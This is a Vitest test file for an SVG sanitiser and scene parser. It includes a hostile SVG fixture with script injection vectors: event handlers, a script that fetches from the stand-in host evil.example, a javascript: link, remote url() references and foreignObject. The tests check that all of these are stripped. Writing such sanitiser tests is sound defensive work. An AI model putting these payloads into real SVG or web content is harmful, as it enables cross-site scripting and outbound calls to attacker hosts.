// @vitest-environment node
import { describe, expect, it } from 'vitest';
import { parseScene, SceneInputError } from './promo-scenes';
import { cleanSvg, SvgError } from './promo-svg';

const HOSTILE = `<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 100 100" onload="alert(1)">
  <!-- comment -->
  <script>fetch('https://evil.example/x')</script>
  <style>.a{fill:url(https://evil.example/p.svg#g)} .b{fill:url(#grad)}</style>
  <defs><linearGradient id="grad"><stop offset="0" stop-color="#f00"/></linearGradient></defs>
  <a href="javascript:alert(1)"><rect id="logo" class="a" width="50" height="50" onclick="x()"/></a>
  <rect fill="url(#grad)" x="60" width="20" height="20"/>
  <image xlink:href="https://evil.example/i.png" width="10" height="10"/>
  <image href="data:image/png;base64,AA==" width="10" height="10"/>
  <use href="#logo" x="50"/>
  <foreignObject><div xmlns="http://www.w3.org/1999/xhtml">hi</div></foreignObject>
  <circle cx="50" cy="50" r="10" style="fill:url('http://evil.example/f')"/>
</svg>`;

describe('cleanSvg', () => {
  const out = cleanSvg(HOSTILE);

  it('drops scripts, handlers, foreign content and every outside link', () => {
    expect(out).not.toMatch(/<script|onload|onclick|foreignObject|javascript:|evil\.example|https?:\/\/(?!www\.w3\.org)/i);
  });

  it('keeps in-file references, data URIs, ids and the viewBox', () => {
    expect(out).toContain('url(#grad)');
    expect(out).toContain('data:image/png;base64,AA==');
    expect(out).toContain('#logo');
    expect(out).toContain('id="logo"');
    expect(out).toContain('viewBox="0 0 100 100"');
  });

  it('is smaller than the input', () => {
    expect(out.length).toBeLessThan(HOSTILE.length);
  });

  it('refuses something that is not an SVG', () => {
    expect(() => cleanSvg('<html><body>no</body></html>')).toThrow(SvgError);
  });

  it('cleans SVG assets whenever a scene is read', () => {
    const scene = parseScene({
      name: 's',
      duration: 2,
      assets: [{ name: 'logo.svg', data: Buffer.from(HOSTILE).toString('base64') }],
    });
    const text = Buffer.from(scene.assets[0].data, 'base64').toString('utf8');
    expect(text).not.toMatch(/<script|onload|evil\.example/);
    expect(() =>
      parseScene({
        name: 's',
        duration: 2,
        assets: [{ name: 'bad.svg', data: Buffer.from('not svg').toString('base64') }],
      }),
    ).toThrow(SceneInputError);
  });
});
